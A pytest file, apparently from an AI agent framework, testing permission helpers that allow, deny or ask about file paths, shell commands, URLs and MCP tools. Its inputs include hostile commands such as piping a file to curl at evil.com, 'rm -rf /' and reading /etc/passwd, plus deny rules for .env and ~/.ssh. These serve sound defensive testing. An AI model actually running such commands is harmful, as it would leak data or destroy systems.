# RFC-0019: 权限匹配 helper 函数单元测试

import pytest

from nexau.archs.main_sub.framework_context import FrameworkContext
from nexau.archs.permissions.helpers import (
    check_mcp_permission,
    check_path_permission,
    check_permission,
    check_shell_permission,
    check_url_permission,
)
from nexau.archs.permissions.types import AskPermission, PermissionDenied

# ---------------------------------------------------------------------------
# check_permission: 通用三态检查
# ---------------------------------------------------------------------------


class TestCheckPermission:
    def test_wildcard_allow(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["**"])
        check_permission(ctx, "anything", "prompt")

    def test_deny_match(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=["npm"])
        with pytest.raises(PermissionDenied) as exc_info:
            check_permission(ctx, "npm", "允许执行 npm install 吗?")
        assert exc_info.value.permission_key == "npm"

    def test_allow_match(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["ls", "cat"], deny_rules=[])
        check_permission(ctx, "ls", "允许执行 ls 吗?")

    def test_no_match_raises_ask(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["ls"], deny_rules=["rm"])
        with pytest.raises(AskPermission) as exc_info:
            check_permission(ctx, "npm", "允许执行 npm install 吗?")
        assert exc_info.value.permission_key == "npm"
        assert exc_info.value.prompt == "允许执行 npm install 吗?"

    def test_empty_rules_raises_ask(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission):
            check_permission(ctx, "any_key", "prompt")

    def test_deny_takes_priority_over_allow(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["npm"], deny_rules=["npm"])
        with pytest.raises(PermissionDenied):
            check_permission(ctx, "npm", "prompt")


# ---------------------------------------------------------------------------
# check_path_permission: 路径专用（gitignore 语义）
# ---------------------------------------------------------------------------


class TestCheckPathPermission:
    def test_wildcard_allow(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["**"])
        check_path_permission(ctx, "/etc/passwd")

    # CC 对齐: 保护路径
    # 注: _PROTECTED_DIRS / _PROTECTED_FILES 当前被清空以恢复 RFC-0019
    # 的向后兼容承诺（无 permissions 字段 = "**" 无条件放行）。等更细的
    # opt-in 策略落地后，把下面三个用例翻回 pytest.raises(AskPermission)。
    def test_protected_dir_passes_with_wildcard(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["**"])
        check_path_permission(ctx, "/project/.git/config")

    def test_protected_file_passes_with_allow(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["/home/**"], deny_rules=[])
        check_path_permission(ctx, "/home/user/.bashrc")

    def test_protected_dirs_all_pass_with_wildcard(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["**"])
        for d in [".git", ".vscode", ".idea", ".husky", ".claude"]:
            check_path_permission(ctx, f"/project/{d}/something")

    def test_non_protected_path_passes_with_wildcard(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["**"])
        check_path_permission(ctx, "/project/src/main.py")

    def test_deny_glob_match(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[".env", "~/.ssh/**"])
        with pytest.raises(PermissionDenied):
            check_path_permission(ctx, ".env")

    def test_allow_glob_match(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["/workspace/**"], deny_rules=[])
        check_path_permission(ctx, "/workspace/src/main.py")

    def test_no_match_raises_ask_with_dir_glob_key(self) -> None:
        ctx = FrameworkContext.for_testing(
            allow_rules=["/workspace/**"],
            deny_rules=[".env"],
        )
        with pytest.raises(AskPermission) as exc_info:
            check_path_permission(ctx, "/etc/passwd")
        # CC 对齐: permission_key 是目录级 glob，不是精确路径
        assert exc_info.value.permission_key == "/etc/**"

    def test_dir_glob_key_allows_sibling_files(self) -> None:
        """allow 一个文件后，同目录下其他文件也自动放行。"""
        # 模拟: 用户 allow 了 /project/foo.py → 规则存为 /project/**
        ctx = FrameworkContext.for_testing(
            allow_rules=["/project/**"],
            deny_rules=[],
        )
        check_path_permission(ctx, "/project/foo.py")
        check_path_permission(ctx, "/project/bar.py")
        check_path_permission(ctx, "/project/sub/deep.py")

    def test_dir_glob_key_does_not_allow_other_dirs(self) -> None:
        ctx = FrameworkContext.for_testing(
            allow_rules=["/project/**"],
            deny_rules=[],
        )
        with pytest.raises(AskPermission) as exc_info:
            check_path_permission(ctx, "/other/secret.txt")
        assert exc_info.value.permission_key == "/other/**"

    def test_deny_takes_priority(self) -> None:
        ctx = FrameworkContext.for_testing(
            allow_rules=["/workspace/**"],
            deny_rules=["/workspace/.env"],
        )
        with pytest.raises(PermissionDenied):
            check_path_permission(ctx, "/workspace/.env")

    def test_empty_rules_raises_ask(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_path_permission(ctx, "/any/path")
        assert exc_info.value.permission_key == "/any/**"

    def test_root_path_dir_glob(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_path_permission(ctx, "/passwd")
        assert exc_info.value.permission_key == "/**"


# ---------------------------------------------------------------------------
# check_shell_permission: 命令专用（shlex 首词匹配）
# ---------------------------------------------------------------------------


class TestCheckShellPermission:
    def test_wildcard_allow(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["**"])
        check_shell_permission(ctx, "rm -rf /")

    def test_deny_first_word(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=["rm", "dd"])
        with pytest.raises(PermissionDenied) as exc_info:
            check_shell_permission(ctx, "rm -rf /tmp/test")
        assert exc_info.value.permission_key == "rm"

    def test_allow_first_word(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["ls", "cat"], deny_rules=[])
        check_shell_permission(ctx, "ls -la /workspace")

    def test_no_match_raises_ask(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["ls"], deny_rules=["rm"])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "npm install express")
        assert exc_info.value.permission_key == "npm install"

    def test_complex_command_parses_first_word(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["git commit"], deny_rules=[])
        check_shell_permission(ctx, "git commit -m 'message with spaces'")

    # CC 对齐: git 子命令粒度
    def test_git_subcommand_granularity(self) -> None:
        """allow git commit 不应该自动放行 git push。"""
        ctx = FrameworkContext.for_testing(allow_rules=["git commit"], deny_rules=[])
        check_shell_permission(ctx, "git commit -m 'test'")
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "git push origin main")
        assert exc_info.value.permission_key == "git push"

    def test_git_write_ask_key_includes_subcommand(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "git commit -m 'test'")
        assert exc_info.value.permission_key == "git commit"

    def test_git_deny_by_subcommand(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=["git push"])
        with pytest.raises(PermissionDenied) as exc_info:
            check_shell_permission(ctx, "git push --force origin main")
        assert exc_info.value.permission_key == "git push"
        # git commit 不受影响
        with pytest.raises(AskPermission):
            check_shell_permission(ctx, "git commit -m 'ok'")

    def test_git_allow_head_allows_all_subcommands(self) -> None:
        """allow 'git' 作为整体 → 所有 git 子命令都放行。"""
        ctx = FrameworkContext.for_testing(allow_rules=["git"], deny_rules=[])
        check_shell_permission(ctx, "git commit -m 'test'")
        check_shell_permission(ctx, "git push origin main")
        check_shell_permission(ctx, "git reset --hard HEAD")

    def test_non_git_command_key_is_head_only(self) -> None:
        """非子命令型命令的 permission_key 是命令头。"""
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "python script.py")
        assert exc_info.value.permission_key == "python"
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "curl https://example.com")
        assert exc_info.value.permission_key == "curl"
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "rm -rf /tmp")
        assert exc_info.value.permission_key == "rm"

    # CC 对齐: 子命令型命令的 permission_key 包含子命令
    def test_npm_subcommand_granularity(self) -> None:
        """allow npm install 不应该自动放行 npm test。"""
        ctx = FrameworkContext.for_testing(allow_rules=["npm install"], deny_rules=[])
        check_shell_permission(ctx, "npm install express")
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "npm test")
        assert exc_info.value.permission_key == "npm test"

    def test_docker_subcommand_granularity(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["docker run"], deny_rules=[])
        check_shell_permission(ctx, "docker run hello-world")
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "docker rm container_id")
        assert exc_info.value.permission_key == "docker rm"

    def test_cargo_subcommand_granularity(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "cargo build --release")
        assert exc_info.value.permission_key == "cargo build"

    def test_subcommand_allow_head_allows_all(self) -> None:
        """allow 'npm' 整体 → 所有 npm 子命令都放行。"""
        ctx = FrameworkContext.for_testing(allow_rules=["npm"], deny_rules=[])
        check_shell_permission(ctx, "npm install express")
        check_shell_permission(ctx, "npm test")
        check_shell_permission(ctx, "npm publish")

    def test_subcommand_deny_by_subcommand(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=["docker rm"])
        with pytest.raises(PermissionDenied):
            check_shell_permission(ctx, "docker rm container_id")
        with pytest.raises(AskPermission):
            check_shell_permission(ctx, "docker run hello")

    def test_command_with_flag_only_uses_head(self) -> None:
        """子命令型命令如果第二个 token 是 flag，key 只取 head。"""
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "npm --version")
        assert exc_info.value.permission_key == "npm"

    def test_pipe_all_readonly_allows(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        check_shell_permission(ctx, "cat file.txt | grep pattern")
        check_shell_permission(ctx, "ls -la | sort | head -5")
        check_shell_permission(ctx, "find . -name '*.py' | wc -l")

    # CC 对齐: 只读命令白名单测试
    def test_readonly_command_auto_allows(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        check_shell_permission(ctx, "ls -la /workspace")
        check_shell_permission(ctx, "cat file.txt")
        check_shell_permission(ctx, "head -n 10 file.txt")
        check_shell_permission(ctx, "grep pattern file.txt")
        check_shell_permission(ctx, "find . -name '*.py'")
        check_shell_permission(ctx, "wc -l file.txt")
        check_shell_permission(ctx, "diff a.txt b.txt")
        check_shell_permission(ctx, "pwd")

    def test_readonly_git_subcommand_auto_allows(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        check_shell_permission(ctx, "git log --oneline")
        check_shell_permission(ctx, "git status")
        check_shell_permission(ctx, "git diff HEAD~1")
        check_shell_permission(ctx, "git branch -a")
        check_shell_permission(ctx, "git show HEAD")

    def test_git_write_subcommand_asks(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "git push origin main")
        assert exc_info.value.permission_key == "git push"
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "git commit -m 'test'")
        assert exc_info.value.permission_key == "git commit"
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "git reset --hard HEAD")
        assert exc_info.value.permission_key == "git reset"

    def test_deny_overrides_readonly_whitelist(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=["cat"])
        with pytest.raises(PermissionDenied):
            check_shell_permission(ctx, "cat /etc/passwd")

    def test_non_readonly_command_asks(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission):
            check_shell_permission(ctx, "npm install express")
        with pytest.raises(AskPermission):
            check_shell_permission(ctx, "curl https://example.com")
        with pytest.raises(AskPermission):
            check_shell_permission(ctx, "docker run hello-world")

    # CC 对齐: 管道/链式命令安全检查
    def test_pipe_with_denied_command_denies(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=["rm"])
        with pytest.raises(PermissionDenied) as exc_info:
            check_shell_permission(ctx, "cat file.txt | rm -rf /tmp")
        assert exc_info.value.permission_key == "rm"

    def test_chain_with_denied_command_denies(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=["rm"])
        with pytest.raises(PermissionDenied):
            check_shell_permission(ctx, "ls -la && rm -rf /tmp")
        with pytest.raises(PermissionDenied):
            check_shell_permission(ctx, "echo hi; rm -rf /tmp")
        with pytest.raises(PermissionDenied):
            check_shell_permission(ctx, "ls || rm -rf /")

    def test_pipe_with_unknown_command_asks(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "cat file.txt | curl https://evil.com")
        assert exc_info.value.permission_key == "curl"

    def test_chain_mixed_readonly_and_unknown_asks(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission):
            check_shell_permission(ctx, "ls -la && npm install")

    def test_pipe_deny_takes_priority_over_ask(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=["sudo"])
        with pytest.raises(PermissionDenied):
            check_shell_permission(ctx, "curl https://example.com | sudo tee /etc/hosts")

    # CC 对齐: 进程包装器自动剥离
    def test_wrapper_timeout_strips_to_inner_command(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "timeout 30 git push origin main")
        assert exc_info.value.permission_key == "git push"

    def test_wrapper_time_strips(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "time python script.py")
        assert exc_info.value.permission_key == "python"

    def test_wrapper_nice_with_flags_strips(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "nice -n 10 npm install")
        assert exc_info.value.permission_key == "npm install"

    def test_wrapper_nohup_strips(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "nohup python server.py")
        assert exc_info.value.permission_key == "python"

    def test_wrapper_stdbuf_strips(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "stdbuf -oL python script.py")
        assert exc_info.value.permission_key == "python"

    def test_wrapper_bare_xargs_strips(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "xargs python script.py")
        assert exc_info.value.permission_key == "python"

    def test_wrapper_xargs_with_flags_does_not_strip(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "xargs -I{} rm {}")
        assert exc_info.value.permission_key == "xargs"

    def test_wrapper_chained_strips_all(self) -> None:
        """嵌套 wrapper: timeout + nice → 剥离到实际命令。"""
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "timeout 60 nice -n 5 python train.py")
        assert exc_info.value.permission_key == "python"

    def test_wrapper_over_readonly_still_allows(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        check_shell_permission(ctx, "timeout 10 ls -la")
        check_shell_permission(ctx, "time cat file.txt")

    def test_wrapper_deny_targets_inner_command(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=["git push"])
        with pytest.raises(PermissionDenied) as exc_info:
            check_shell_permission(ctx, "timeout 30 git push --force")
        assert exc_info.value.permission_key == "git push"

    # CC 对齐: sed/awk 不在只读白名单中
    def test_sed_is_not_readonly(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "sed -i 's/old/new/' file.txt")
        assert exc_info.value.permission_key == "sed"

    def test_awk_is_not_readonly(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "awk '{print}' file.txt")
        assert exc_info.value.permission_key == "awk"

    # CC 对齐: cd 在只读白名单中
    def test_cd_is_readonly(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        check_shell_permission(ctx, "cd /tmp")

    # CC 对齐: 新增 git 只读子命令
    def test_git_grep_is_readonly(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        check_shell_permission(ctx, "git grep TODO")

    # CC 对齐: 输出重定向检测
    def test_redirect_overrides_readonly(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission):
            check_shell_permission(ctx, "cat secret.txt > out.txt")

    def test_redirect_append_overrides_readonly(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission):
            check_shell_permission(ctx, "echo hello >> log.txt")

    def test_redirect_stderr_overrides_readonly(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission):
            check_shell_permission(ctx, "grep pattern file 2>/dev/null")

    def test_redirect_ampersand_overrides_readonly(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission):
            check_shell_permission(ctx, "cat file &> output.txt")

    def test_git_readonly_with_redirect_asks(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission):
            check_shell_permission(ctx, "git log > history.txt")

    def test_no_redirect_still_readonly(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        check_shell_permission(ctx, "cat file.txt")
        check_shell_permission(ctx, "grep pattern file.txt")
        check_shell_permission(ctx, "git log --oneline")

    # CC 对齐: shell -c 递归
    def test_shell_c_checks_inner_command(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, 'bash -c "git push"')
        assert exc_info.value.permission_key == "git push"

    def test_shell_c_readonly_inner_allows(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        check_shell_permission(ctx, 'sh -c "ls -la"')

    def test_shell_c_deny_inner_denies(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=["rm"])
        with pytest.raises(PermissionDenied):
            check_shell_permission(ctx, 'bash -c "rm -rf /"')

    def test_shell_c_inner_pipe_all_readonly(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        check_shell_permission(ctx, 'bash -c "git log | grep pattern"')

    def test_shell_c_inner_pipe_with_ask(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, 'zsh -c "ls && npm install"')
        assert exc_info.value.permission_key == "npm install"

    def test_shell_c_with_flags_before_c(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, 'bash --login -c "git push"')
        assert exc_info.value.permission_key == "git push"

    def test_bare_bash_without_c_asks(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "bash script.sh")
        assert exc_info.value.permission_key == "bash"

    # CC 对齐: env 穿透
    def test_env_standalone_is_readonly(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        check_shell_permission(ctx, "env")

    def test_env_with_assignment_only_is_readonly(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        check_shell_permission(ctx, "env HOME=/tmp")

    def test_env_wrapping_command_checks_inner(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "env FOO=bar git push")
        assert exc_info.value.permission_key == "git push"

    def test_env_with_flag_wrapping_command(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "env -i git push")
        assert exc_info.value.permission_key == "git push"

    def test_env_wrapping_readonly_allows(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        check_shell_permission(ctx, "env FOO=bar ls -la")

    def test_env_chained_with_wrapper(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_shell_permission(ctx, "timeout 30 env FOO=bar git push")
        assert exc_info.value.permission_key == "git push"


# ---------------------------------------------------------------------------
# check_url_permission: 域名级（CC 对齐 WebFetch）
# ---------------------------------------------------------------------------


class TestCheckUrlPermission:
    def test_wildcard_allow(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["**"])
        check_url_permission(ctx, "https://evil.com/hack")

    def test_deny_exact_domain(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=["evil.com"])
        with pytest.raises(PermissionDenied):
            check_url_permission(ctx, "https://evil.com/path")

    def test_deny_wildcard_subdomain(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=["*.evil.com"])
        with pytest.raises(PermissionDenied):
            check_url_permission(ctx, "https://api.evil.com/data")

    def test_allow_exact_domain(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["github.com"], deny_rules=[])
        check_url_permission(ctx, "https://github.com/user/repo")

    def test_allow_wildcard_subdomain(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["*.github.com"], deny_rules=[])
        check_url_permission(ctx, "https://api.github.com/repos")

    def test_no_match_raises_ask(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["github.com"], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_url_permission(ctx, "https://unknown.com/page")
        assert exc_info.value.permission_key == "unknown.com"

    def test_deny_takes_priority(self) -> None:
        ctx = FrameworkContext.for_testing(
            allow_rules=["*.example.com"],
            deny_rules=["secret.example.com"],
        )
        with pytest.raises(PermissionDenied):
            check_url_permission(ctx, "https://secret.example.com/data")

    def test_empty_rules_raises_ask(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission):
            check_url_permission(ctx, "https://any-site.com")


# ---------------------------------------------------------------------------
# check_mcp_permission: MCP 工具（CC 对齐 server/tool 双层匹配）
# ---------------------------------------------------------------------------


class TestCheckMcpPermission:
    def test_wildcard_allow(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["**"])
        check_mcp_permission(ctx, "github", "create_issue")

    def test_deny_by_tool_key(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=["mcp__github__create_issue"])
        with pytest.raises(PermissionDenied) as exc_info:
            check_mcp_permission(ctx, "github", "create_issue")
        assert exc_info.value.permission_key == "mcp__github__create_issue"

    def test_deny_by_server_key(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=["mcp__github"])
        with pytest.raises(PermissionDenied):
            check_mcp_permission(ctx, "github", "create_issue")

    def test_allow_by_tool_key(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["mcp__github__create_issue"], deny_rules=[])
        check_mcp_permission(ctx, "github", "create_issue")

    def test_allow_by_server_key(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["mcp__github"], deny_rules=[])
        check_mcp_permission(ctx, "github", "create_issue")
        check_mcp_permission(ctx, "github", "list_repos")

    def test_no_match_raises_ask(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission) as exc_info:
            check_mcp_permission(ctx, "github", "create_issue")
        assert exc_info.value.permission_key == "mcp__github__create_issue"

    def test_server_deny_overrides_tool_allow(self) -> None:
        ctx = FrameworkContext.for_testing(
            allow_rules=["mcp__github__create_issue"],
            deny_rules=["mcp__github"],
        )
        with pytest.raises(PermissionDenied):
            check_mcp_permission(ctx, "github", "create_issue")

    def test_tool_allow_does_not_leak_to_other_tools(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["mcp__github__create_issue"], deny_rules=[])
        with pytest.raises(AskPermission):
            check_mcp_permission(ctx, "github", "delete_repo")

    def test_server_allow_does_not_leak_to_other_servers(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=["mcp__github"], deny_rules=[])
        with pytest.raises(AskPermission):
            check_mcp_permission(ctx, "slack", "send_message")

    def test_empty_rules_always_asks(self) -> None:
        ctx = FrameworkContext.for_testing(allow_rules=[], deny_rules=[])
        with pytest.raises(AskPermission):
            check_mcp_permission(ctx, "puppeteer", "navigate")
        with pytest.raises(AskPermission):
            check_mcp_permission(ctx, "github", "search")


# ---------------------------------------------------------------------------
# FrameworkContext.for_tool_call
# ---------------------------------------------------------------------------


class TestFrameworkContextForToolCall:
    def test_creates_independent_context(self) -> None:
        base = FrameworkContext.for_testing(
            session_id="sess_1",
            allow_rules=["**"],
        )
        tool_ctx = base.for_tool_call(
            tool_name="write_file",
            allow_rules=["/workspace/**"],
            deny_rules=[".env"],
        )

        assert tool_ctx.tool_name == "write_file"
        assert tool_ctx.allow_rules == ["/workspace/**"]
        assert tool_ctx.deny_rules == [".env"]
        assert tool_ctx.session_id == "sess_1"
        assert tool_ctx.agent_name == base.agent_name

    def test_does_not_mutate_base(self) -> None:
        base = FrameworkContext.for_testing(allow_rules=["**"])
        base.for_tool_call(
            tool_name="shell",
            allow_rules=["ls"],
            deny_rules=["rm"],
        )
        assert base.allow_rules == ["**"]
        assert base.deny_rules == []

    def test_shares_tools_api(self) -> None:
        base = FrameworkContext.for_testing()
        tool_ctx = base.for_tool_call(
            tool_name="test",
            allow_rules=["**"],
            deny_rules=[],
        )
        assert tool_ctx.tools is not None
        assert tool_ctx.execution is not None
